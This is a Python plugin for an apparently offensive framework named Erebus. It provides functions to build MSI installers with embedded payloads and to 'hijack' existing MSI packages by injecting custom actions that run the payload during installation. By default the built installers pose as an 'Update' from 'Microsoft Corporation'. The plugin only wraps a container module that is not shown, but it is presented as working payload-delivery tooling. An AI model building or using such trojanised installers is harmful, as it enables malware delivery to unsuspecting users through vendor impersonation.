"""
Erebus Plugin - MSI Container
Author: Whispergate
Description: Plugin for creating and hijacking MSI installers

This plugin demonstrates:
1. How to inherit from ErebusPlugin
2. How to wrap existing container_msi module
3. How to create/manipulate MSI packages for payload delivery
"""

import pathlib
from typing import Dict, Callable, List

try:
    from erebus_wrapper.erebus.modules.plugin_base import ErebusPlugin, PluginMetadata, PluginCategory
except ImportError:
    from plugin_base import ErebusPlugin, PluginMetadata, PluginCategory


class MsiContainerPlugin(ErebusPlugin):
    """
    Plugin for creating and manipulating MSI containers.
    
    This plugin provides functionality to:
    - Build new MSI installers with embedded payloads
    - Hijack existing MSI files to inject malicious actions
    - Add multiple files to MSI packages
    - Create custom actions for payload execution
    """
    
    def __init__(self):
        """Initialize the MSI container plugin"""
        super().__init__()
        self.REPO_ROOT = pathlib.Path(__file__).resolve().parents[2]
        self.DEFAULT_ROOT = self.REPO_ROOT / "agent_code"
    
    def get_metadata(self) -> PluginMetadata:
        """Return plugin metadata"""
        return PluginMetadata(
            name="msi_container",
            version="1.0.0",
            author="Whispergate",
            description="Creates and manipulates MSI installers for payload delivery",
            category=PluginCategory.CONTAINER,
            enabled=True
        )
    
    def register(self) -> Dict[str, Callable]:
        """Register the functions this plugin provides"""
        return {
            "build_msi": self.build_msi,
            "hijack_msi": self.hijack_msi,
            "add_multiple_files_to_msi": self.add_multiple_files_to_msi,
            "create_custom_action": self.create_custom_action,
        }
    
    def validate(self) -> tuple[bool, str]:
        """Validate that required dependencies are available"""
        try:
            import sys
            if sys.platform != "win32":
                return (False, "MSI manipulation requires Windows platform")
            
            import msilib
            import olefile
            return (True, None)
        except ImportError as e:
            return (False, f"Missing required dependency: {e}")
    
    def on_load(self):
        """Called when plugin is loaded"""
        print(f"[Plugin] MSI Container plugin loaded - Supporting MSI creation and manipulation")

    def _get_container_msi(self):
        """Lazy import for archive.container_msi"""
        try:
            from .archive import container_msi
        except ImportError:
            from archive import container_msi
        return container_msi
    
    # ==================== Plugin Functions ====================
    
    def build_msi(
        self,
        build_path: pathlib.Path,
        product_name: str = "Update",
        manufacturer: str = "Microsoft Corporation",
        version: str = "1.0.0",
        use_admin: bool = False,
        action_type: str = "execute",
        action_args: str = None,
        output_name: str = None
    ) -> pathlib.Path:
        """
        Build a new MSI installer with embedded payload.
        
        Args:
            build_path: Path to the build directory
            product_name: Name of the product
            manufacturer: Manufacturer name
            version: Product version
            use_admin: Require administrator privileges
            action_type: Type of custom action (execute, script, dll-load, file-drop)
            action_args: Arguments for the custom action
            output_name: Custom output filename
            
        Returns:
            pathlib.Path: Path to the created MSI file
            
        Raises:
            RuntimeError: If MSI creation fails
        """
        container_msi = self._get_container_msi()
        return container_msi.build_msi(
            build_path=build_path,
            product_name=product_name,
            manufacturer=manufacturer,
            version=version,
            use_admin=use_admin,
            action_type=action_type,
            action_args=action_args,
            output_name=output_name
        )
    
    def hijack_msi(
        self,
        source_msi: pathlib.Path,
        payload_path: pathlib.Path,
        action_type: str = "execute",
        action_args: str = None,
        sequence: str = "InstallFinalize",
        output_dir: pathlib.Path = None
    ) -> pathlib.Path:
        """
        Hijack an existing MSI installer by injecting a custom action.
        
        Args:
            source_msi: Path to the source MSI file
            payload_path: Path to the payload file to inject
            action_type: Type of custom action to inject
            action_args: Arguments for the custom action
            sequence: Installation sequence point for action execution
            output_dir: Directory for output (uses container dir if None)
            
        Returns:
            pathlib.Path: Path to the modified MSI file
            
        Raises:
            RuntimeError: If MSI hijacking fails
        """
        container_msi = self._get_container_msi()
        return container_msi.hijack_msi(
            source_msi=source_msi,
            payload_path=payload_path,
            action_type=action_type,
            action_args=action_args,
            sequence=sequence,
            output_dir=output_dir
        )
    
    def add_multiple_files_to_msi(
        self,
        source_msi: pathlib.Path,
        files_to_add: List[pathlib.Path],
        target_dir: str = "TARGETDIR",
        output_dir: pathlib.Path = None
    ) -> pathlib.Path:
        """
        Add multiple files to an existing MSI package.
        
        Args:
            source_msi: Path to the source MSI file
            files_to_add: List of file paths to add to the MSI
            target_dir: Target directory identifier in MSI
            output_dir: Directory for output (uses container dir if None)
            
        Returns:
            pathlib.Path: Path to the modified MSI file
            
        Raises:
            RuntimeError: If file addition fails
        """
        container_msi = self._get_container_msi()
        return container_msi.add_multiple_files_to_msi(
            source_msi=source_msi,
            files_to_add=files_to_add,
            target_dir=target_dir,
            output_dir=output_dir
        )
    
    def create_custom_action(
        self,
        db,
        action_name: str,
        action_type: int,
        source: str,
        target: str,
        sequence_table: str = "InstallExecuteSequence",
        after_action: str = "InstallFinalize",
        condition: str = None
    ):
        """
        Create a custom action in an MSI database.
        
        Args:
            db: MSI database object
            action_name: Name of the custom action
            action_type: Type code for the custom action
            source: Source for the action (Binary table entry, etc.)
            target: Target (command line, entry point, etc.)
            sequence_table: Sequence table to add the action to
            after_action: Action to execute this custom action after
            condition: Optional condition for action execution
            
        Raises:
            RuntimeError: If custom action creation fails
        """
        container_msi = self._get_container_msi()
        return container_msi.create_custom_action(
            db=db,
            action_name=action_name,
            action_type=action_type,
            source=source,
            target=target,
            sequence_table=sequence_table,
            after_action=after_action,
            condition=condition
        )


def get_plugin() -> MsiContainerPlugin:
    """Factory function to get plugin instance"""
    return MsiContainerPlugin()


if __name__ == "__main__":
    _plugin = MsiContainerPlugin()
    _metadata = _plugin.get_metadata()
    print(f"[*] {_metadata.name} v{_metadata.version}")
    print(f"[*] Category: {_metadata.category.value}")
    print(f"[*] Description: {_metadata.description}")
    print()
    
    # Display all registered functions
    registered = _plugin.register()
    registered_names = sorted(registered.keys()) if registered else []
    print(f"[*] Registered functions ({len(registered_names)}):")
    for func_name in registered_names:
        print(f"    - {func_name}")
    print()
    
    is_valid, error = _plugin.validate()
    if is_valid:
        print("[+] Validation passed")
    else:
        print(f"[-] Validation failed: {error}")
